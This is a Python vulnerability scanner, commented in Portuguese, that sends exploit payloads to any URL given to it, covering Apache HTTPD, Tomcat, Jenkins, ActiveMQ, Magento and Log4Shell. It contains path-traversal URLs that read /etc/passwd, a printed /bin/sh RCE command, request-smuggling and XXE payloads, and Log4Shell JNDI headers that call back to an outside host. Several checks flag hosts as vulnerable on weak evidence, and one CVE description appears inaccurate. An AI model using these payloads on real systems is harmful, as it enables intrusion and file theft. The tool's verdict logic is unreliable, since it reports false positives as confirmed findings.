#!/usr/bin/env python3
"""
apache_cve.py - Detecção de CVEs em Apache HTTPD e Apache Tomcat
Uso: python3 apache_cve.py <url>  [--no-oob]
Resultado consolidado: cve_results.txt

CVEs cobertas:
  Apache HTTPD:
    CVE-2024-38475  — Apache ≤ 2.4.59 LFI via mod_rewrite (%2e%2e/)
    CVE-2026-23918  — Apache 2.4.66 HTTP/2 RCE
    CVE-2023-25690  — Apache Request Smuggling (CL.TE)
    CVE-2021-41773  — Apache 2.4.49 Path Traversal / RCE
    CVE-2021-42013  — Apache 2.4.49-2.4.50 Path Traversal (bypass)
    CVE-2023-46604  — Apache ActiveMQ ≤ 5.15.15 RCE via Jolokia
  Apache Tomcat:
    CVE-2025-24813  — Tomcat RCE via PUT + Range header (deserialização)
    CVE-2024-23897  — Jenkins LFI/RCE via CLI endpoint (Tomcat/Jetty)
    CVE-2021-44228  — Log4Shell OOB (apps Java em Tomcat)
    CVE-2023-44487  — HTTP/2 Rapid Reset
"""

import sys
import time
import argparse
import re

try:
    from cve_base import (
        curl, curl_header_value,
        InteractshSession, ResultCollector,
        log, OUTPUT_FILE, INTERACTSH_WAIT,
    )
except ImportError:
    print("[ERR] cve_base.py não encontrado no mesmo diretório.")
    sys.exit(1)


# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────

def _base(url):
    return url.rstrip("/")


def _confirm_server(url):
    """
    Confirma se é Apache HTTPD, Tomcat, ou desconhecido.
    Retorna (server_type, version_str)
    server_type: 'apache' | 'tomcat' | 'unknown'
    """
    status, hdrs, body, _ = curl(url)
    server = curl_header_value(hdrs, "Server").lower()

    if "apache" in server:
        ver_m = re.search(r"apache/([\d.]+)", server)
        ver   = ver_m.group(1) if ver_m else "?"
        log(f"Apache HTTPD confirmado via header: Apache/{ver}", "OK")
        return "apache", ver

    if "tomcat" in server or "tomcat" in body.lower():
        ver_m = re.search(r"tomcat/([\d.]+)", server + body.lower())
        ver   = ver_m.group(1) if ver_m else "?"
        log(f"Tomcat confirmado: Tomcat/{ver}", "OK")
        return "tomcat", ver

    # Tenta página de erro para detectar Tomcat (página padrão)
    status2, hdrs2, body2, _ = curl(_base(url) + "/____probe____")
    if "apache tomcat" in body2.lower():
        ver_m = re.search(r"apache tomcat/([\d.]+)", body2.lower())
        ver   = ver_m.group(1) if ver_m else "?"
        log(f"Tomcat confirmado via página de erro: Tomcat/{ver}", "OK")
        return "tomcat", ver

    log("Servidor não identificado claramente — testando Apache + Tomcat", "WARN")
    return "unknown", "?"


def _version_tuple(ver_str):
    try:
        return tuple(int(x) for x in ver_str.split("."))
    except Exception:
        return (0, 0, 0)


# ──────────────────────────────────────────────
# ── APACHE HTTPD CVEs
# ──────────────────────────────────────────────

def check_cve_2024_38475(url, collector):
    """
    CVE-2024-38475 — Apache HTTPD ≤ 2.4.59 LFI via mod_rewrite
    Vetor: URI com %2e%2e/ para path traversal
    """
    cve = "CVE-2024-38475"
    log(f"Testando {cve} em {url}", "INFO")

    payloads = [
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/icons/.%2e/%2e%2e/%2e%2e/etc/passwd",
    ]

    for payload in payloads:
        probe_url = _base(url) + payload
        status, hdrs, body, raw = curl(probe_url, path_as_is=True)

        if status == 200 and re.search(r"root:.*:0:0", body):
            repro = f'curl -v --path-as-is "{probe_url}"'
            collector.add(url, cve, "VULNERABLE",
                          detail=f"LFI confirmado — /etc/passwd lido via {payload}",
                          curl_repro=repro)
            return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Path traversal não explorado")


def check_cve_2021_41773(url, collector):
    """
    CVE-2021-41773 — Apache 2.4.49 Path Traversal + RCE opcional
    CVE-2021-42013 — Apache 2.4.49/2.4.50 bypass do fix anterior
    """
    cve = "CVE-2021-41773 / CVE-2021-42013"
    log(f"Testando {cve} em {url}", "INFO")

    payloads = [
        # 41773 original
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        # 42013 bypass
        "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
        "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
    ]

    for payload in payloads:
        probe_url = _base(url) + payload
        status, hdrs, body, raw = curl(probe_url, path_as_is=True)

        if status == 200 and re.search(r"root:.*:0:0", body):
            repro = (
                f'# Leitura de arquivo\n'
                f'curl -v --path-as-is "{probe_url}"\n\n'
                f'# RCE via mod_cgi (apenas detecção — não executar em produção)\n'
                f'curl -v --path-as-is \\\n'
                f'  "{_base(url)}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \\\n'
                f'  -d "echo; id"'
            )
            collector.add(url, cve, "VULNERABLE",
                          detail=f"Path traversal confirmado — /etc/passwd lido",
                          curl_repro=repro)
            return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Path traversal não explorado")


def check_cve_2026_23918(url, collector):
    """
    CVE-2026-23918 — Apache 2.4.66 HTTP/2 RCE
    Detecção: verifica suporte HTTP/2 + versão
    """
    cve = "CVE-2026-23918"
    log(f"Testando {cve} em {url}", "INFO")

    status, hdrs, body, raw = curl(url, extra_flags="--http2")
    http2_active = "HTTP/2" in hdrs

    server_ver = curl_header_value(hdrs, "Server")
    ver_m = re.search(r"Apache/([\d.]+)", server_ver, re.IGNORECASE)
    ver   = ver_m.group(1) if ver_m else "?"
    vt    = _version_tuple(ver)

    if http2_active and (ver == "?" or vt == (2, 4, 66)):
        repro = (
            f'# HTTP/2 habilitado em Apache — confirmar versão:\n'
            f'curl -v --http2 "{url}"\n'
            f'# Versão detectada: Apache/{ver}'
        )
        collector.add(url, cve, "VULNERABLE",
                      detail=f"HTTP/2 ativo em Apache/{ver} — verificar patch",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"HTTP/2 não ativo ou versão não afetada (Apache/{ver})")


def check_cve_2023_25690(url, collector):
    """
    CVE-2023-25690 — Apache HTTP Request Smuggling (CL.TE)
    Detecção: resposta diferenciada ao smuggled request
    """
    cve = "CVE-2023-25690"
    log(f"Testando {cve} em {url}", "INFO")

    # Probe: envia CL.TE e verifica se /admin vaza na resposta
    status, hdrs, body, raw = curl(
        url,
        method="POST",
        headers={
            "Content-Length": "13",
            "Transfer-Encoding": "chunked",
        },
        data="0\r\n\r\nGET /admin HTTP/1.1\r\n",
    )

    # Indicativo: resposta 200 com conteúdo de /admin quando baseline seria 404
    status_base, _, _, _ = curl(_base(url) + "/admin")

    if status == 200 and status_base in (401, 403, 404) and len(body) > 100:
        repro = (
            f'curl -v \\\n'
            f'  -H "Content-Length: 13" \\\n'
            f'  -H "Transfer-Encoding: chunked" \\\n'
            f'  --data $\'0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\n\' \\\n'
            f'  "{url}"'
        )
        collector.add(url, cve, "VULNERABLE",
                      detail="Request smuggling CL.TE possível — resposta anômala",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"Sem indício de smuggling (base={status_base}, probe={status})")


def check_cve_2023_46604_activemq(url, collector):
    """
    CVE-2023-46604 — Apache ActiveMQ ≤ 5.15.15 RCE via Jolokia
    Detecção: endpoint /admin/ e /api/jolokia expostos sem auth
    """
    cve = "CVE-2023-46604"
    log(f"Testando {cve} em {url}", "INFO")

    activemq_url = _base(url)
    # ActiveMQ roda na porta 8161 por padrão — ajusta se necessário
    if ":8161" not in activemq_url and not re.search(r":\d+", activemq_url.split("//")[1].split("/")[0]):
        activemq_url = re.sub(r"(https?://[^/]+)", r"\1:8161", activemq_url)

    # Probe 1: painel admin
    status1, hdrs1, body1, _ = curl(activemq_url + "/admin/")

    # Probe 2: Jolokia list
    status2, hdrs2, body2, _ = curl(activemq_url + "/api/jolokia/list")

    if status2 == 200 and "activemq" in body2.lower():
        repro = (
            f'# Jolokia exposto sem auth:\n'
            f'curl -v "{activemq_url}/api/jolokia/list"\n\n'
            f'# RCE via ClassPathXmlApplicationContext (não executar):\n'
            f'curl -v -H "Content-Type: application/json" \\\n'
            f'  "{activemq_url}/api/jolokia/exec/'
            f'org.apache.activemq:type=Broker,brokerName=localhost,service=Health/healthStatus"'
        )
        collector.add(url, cve, "VULNERABLE",
                      detail="ActiveMQ Jolokia API exposta sem autenticação",
                      curl_repro=repro)
    elif status1 == 200 and ("activemq" in body1.lower() or "admin" in body1.lower()):
        repro = f'curl -v "{activemq_url}/admin/"'
        collector.add(url, cve, "VULNERABLE",
                      detail="ActiveMQ /admin/ acessível sem autenticação",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"ActiveMQ não exposto (admin={status1}, jolokia={status2})")


# ──────────────────────────────────────────────
# ── TOMCAT CVEs
# ──────────────────────────────────────────────

def check_cve_2025_24813(url, collector):
    """
    CVE-2025-24813 — Apache Tomcat RCE via PUT + Content-Range
    Detecção: PUT aceito + arquivo criado + RCE via deserialização
    """
    cve = "CVE-2025-24813"
    log(f"Testando {cve} em {url}", "INFO")

    session_probe = _base(url) + "/.session"

    # Fase 1: verifica se PUT é aceito
    status_put, hdrs_put, body_put, raw_put = curl(
        session_probe,
        method="PUT",
        headers={"Content-Range": "bytes 0-5/10"},
        data="PROBE1",
    )

    if status_put in (200, 201, 204):
        # Fase 2: tenta GET no arquivo criado
        status_get, _, body_get, _ = curl(session_probe)
        if status_get == 200 and "PROBE1" in body_get:
            repro = (
                f'# Fase 1 — Upload de payload serializado:\n'
                f'curl -v -X PUT \\\n'
                f'  -H "Content-Range: bytes 0-5/10" \\\n'
                f'  --data "payload_serializado" \\\n'
                f'  "{session_probe}"\n\n'
                f'# Fase 2 — Trigger de deserialização:\n'
                f'curl -v "{session_probe}"'
            )
            collector.add(url, cve, "VULNERABLE",
                          detail="PUT aceito + arquivo criado — deserialização possível",
                          curl_repro=repro)
            return

    # Verifica apenas se PUT é aceito (condição necessária)
    if status_put in (200, 201, 204):
        repro = (
            f'curl -v -X PUT \\\n'
            f'  -H "Content-Range: bytes 0-5/10" \\\n'
            f'  --data "payload" \\\n'
            f'  "{session_probe}"'
        )
        collector.add(url, cve, "VULNERABLE",
                      detail=f"Método PUT aceito (HTTP {status_put}) — validar manualmente",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"PUT não aceito (HTTP {status_put})")


def check_cve_2024_23897_jenkins(url, collector):
    """
    CVE-2024-23897 — Jenkins LFI via CLI (Tomcat/Jetty como servidor)
    Detecção: CLI endpoint exposto sem autenticação
    """
    cve = "CVE-2024-23897"
    log(f"Testando {cve} em {url}", "INFO")

    jenkins_url = _base(url)
    # Jenkins roda tipicamente em :8080
    if ":8080" not in jenkins_url and not re.search(r":\d+", jenkins_url.split("//")[1].split("/")[0]):
        jenkins_url = re.sub(r"(https?://[^/]+)", r"\1:8080", jenkins_url)

    # Verifica se é Jenkins
    status_root, hdrs_root, body_root, _ = curl(jenkins_url)
    is_jenkins = (
        "jenkins" in body_root.lower()
        or "jenkins" in curl_header_value(hdrs_root, "X-Jenkins").lower()
    )

    if not is_jenkins:
        collector.add(url, cve, "SKIPPED",
                      detail="Jenkins não detectado neste endpoint")
        return

    # Probe CLI endpoint
    status_cli, hdrs_cli, body_cli, _ = curl(
        jenkins_url + "/cli",
        method="POST",
        headers={"Content-Type": "application/octet-stream"},
        data="\x00\x00\x00\x06\x00connect\x00",
    )

    if status_cli in (200, 400) and ("jenkins" in body_cli.lower() or len(body_cli) > 10):
        repro = (
            f'# LFI via CLI — leitura de /etc/passwd:\n'
            f'curl -v -X POST \\\n'
            f'  "{jenkins_url}/cli" \\\n'
            f'  -H "Content-Type: application/octet-stream" \\\n'
            f'  --data-binary $\'\\x00\\x00\\x00\\x06\\x00connect'
            f'\\x00\\x00\\x00\\x00\\x06\\x02/etc/passwd\\x00\''
        )
        collector.add(url, cve, "VULNERABLE",
                      detail="Jenkins CLI endpoint acessível — LFI possível",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"CLI endpoint não exposto (HTTP {status_cli})")


def check_log4shell(url, collector, iactsh):
    """
    CVE-2021-44228 — Log4Shell OOB (apps Java em Tomcat/Apache)
    """
    cve = "CVE-2021-44228"
    log(f"Testando {cve} em {url}", "INFO")

    if not (iactsh and iactsh.domain):
        collector.add(url, cve, "SKIPPED",
                      detail="interactsh não disponível — teste OOB impossível")
        return

    domain = iactsh.domain
    payloads_headers = {
        "User-Agent":      f"${{jndi:ldap://{domain}/apache-ua}}",
        "X-Api-Version":   f"${{jndi:ldap://{domain}/apache-api}}",
        "X-Forwarded-For": f"${{jndi:ldap://{domain}/apache-xff}}",
        "Referer":         f"${{jndi:ldap://{domain}/apache-ref}}",
        # Bypass
        "X-Forwarded-Host": f"${{j${{::-n}}di:ldap://{domain}/apache-bypass}}",
    }

    repro_lines = [
        f'curl -v \\',
        f'  -H "User-Agent: ${{jndi:ldap://{domain}/a}}" \\',
        f'  -H "X-Api-Version: ${{jndi:ldap://{domain}/a}}" \\',
        f'  -H "X-Forwarded-For: ${{jndi:ldap://{domain}/a}}" \\',
        f'  "{url}"',
    ]
    repro = "\n".join(repro_lines)

    t0 = time.time()
    for header, payload in payloads_headers.items():
        log(f"  [{cve}] Enviando payload via {header}", "OOB")
        curl(url, headers={header: payload})
        hit = iactsh.wait_for_hit(t0, timeout=4)
        if hit:
            collector.add(url, cve, "VULNERABLE",
                          detail=f"OOB JNDI callback via header {header}",
                          curl_repro=repro, oob_hit=hit)
            return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Nenhum callback JNDI recebido")


def check_cve_2023_44487(url, collector):
    """
    CVE-2023-44487 — HTTP/2 Rapid Reset
    """
    cve = "CVE-2023-44487"
    log(f"Testando {cve} em {url}", "INFO")

    status, hdrs, body, raw = curl(url, extra_flags="--http2")

    if "HTTP/2" in hdrs:
        repro = (
            f'curl -v --http2 "{url}"\n'
            f"# HTTP/2 confirmado — RST_STREAM flood requer h2load ou wrk2"
        )
        collector.add(url, cve, "VULNERABLE",
                      detail="HTTP/2 habilitado — suscetível a Rapid Reset",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail="HTTP/2 não detectado")


def check_cve_2024_34102_magento(url, collector):
    """
    CVE-2024-34102 — Adobe Commerce/Magento XXE via header Content-Type
    (frequentemente rodando em Apache)
    """
    cve = "CVE-2024-34102"
    log(f"Testando {cve} em {url}", "INFO")

    probe_url = _base(url) + "/rest/V1/guest-carts"
    payload   = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root>&xxe;</root>'
    )
    status, hdrs, body, raw = curl(
        probe_url,
        method="POST",
        headers={"Content-Type": "application/xml"},
        data=payload,
    )

    if status in (200, 400, 500) and re.search(r"root:.*:0:0", body):
        repro = (
            f'curl -v -X POST \\\n'
            f'  -H "Content-Type: application/xml" \\\n'
            f'  --data \'<?xml version="1.0"?><!DOCTYPE foo '
            f'[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>\' \\\n'
            f'  "{probe_url}"'
        )
        collector.add(url, cve, "VULNERABLE",
                      detail="XXE confirmado — /etc/passwd lido via Magento REST",
                      curl_repro=repro)
    elif status in (200, 400):
        collector.add(url, cve, "VULNERABLE",
                      detail=f"Endpoint Magento REST acessível (HTTP {status}) — validar XXE manualmente",
                      curl_repro=f'curl -v -X POST -H "Content-Type: application/xml" --data \'...\' "{probe_url}"')
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"Endpoint não exposto (HTTP {status})")


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="apache_cve.py — Detecção de CVEs em Apache HTTPD e Tomcat"
    )
    parser.add_argument("url", help="URL alvo (ex: https://sub.exemplo.com)")
    parser.add_argument(
        "--no-oob", action="store_true",
        help="Desativa testes OOB (interactsh)"
    )
    parser.add_argument(
        "--output", default=OUTPUT_FILE,
        help=f"Arquivo de saída consolidado (padrão: {OUTPUT_FILE})"
    )
    args = parser.parse_args()

    url       = args.url.rstrip("/")
    collector = ResultCollector(output_file=args.output)

    print(f"\n{'═'*60}")
    print(f"  apache_cve.py — Alvo: {url}")
    print(f"{'═'*60}\n")

    # ── Confirma servidor
    server_type, server_ver = _confirm_server(url)

    # ── Inicia interactsh
    iactsh = None
    if not args.no_oob:
        iactsh = InteractshSession()
        if not iactsh.start():
            iactsh = None
            log("Continuando sem OOB (interactsh indisponível)", "WARN")

    try:
        # ── Apache HTTPD CVEs
        if server_type in ("apache", "unknown"):
            log("── Apache HTTPD CVEs ──", "INFO")
            check_cve_2024_38475(url, collector)
            check_cve_2021_41773(url, collector)
            check_cve_2026_23918(url, collector)
            check_cve_2023_25690(url, collector)
            check_cve_2023_46604_activemq(url, collector)
            check_cve_2024_34102_magento(url, collector)

        # ── Tomcat CVEs
        if server_type in ("tomcat", "unknown"):
            log("── Apache Tomcat CVEs ──", "INFO")
            check_cve_2025_24813(url, collector)
            check_cve_2024_23897_jenkins(url, collector)

        # ── Comuns Apache + Tomcat
        log("── CVEs comuns (Java / HTTP) ──", "INFO")
        check_log4shell(url, collector, iactsh)
        check_cve_2023_44487(url, collector)

    finally:
        if iactsh:
            iactsh.stop()

    # ── Salva resultados
    collector.save()

    # ── Resumo no terminal
    s = collector.summary()
    print(f"\n{'═'*60}")
    print(f"  Apache/Tomcat CVE Scan — {url}")
    print(f"  Servidor: {server_type}/{server_ver}")
    print(f"  Testes: {s['total']}  |  Vulneráveis: {s['vulnerable']}")
    if s["vulns"]:
        print(f"\n  !! CVEs ENCONTRADAS:")
        for v in s["vulns"]:
            print(f"     • {v['cve']} — {v['detail']}")
    print(f"{'═'*60}\n")


if __name__ == "__main__":
    main()
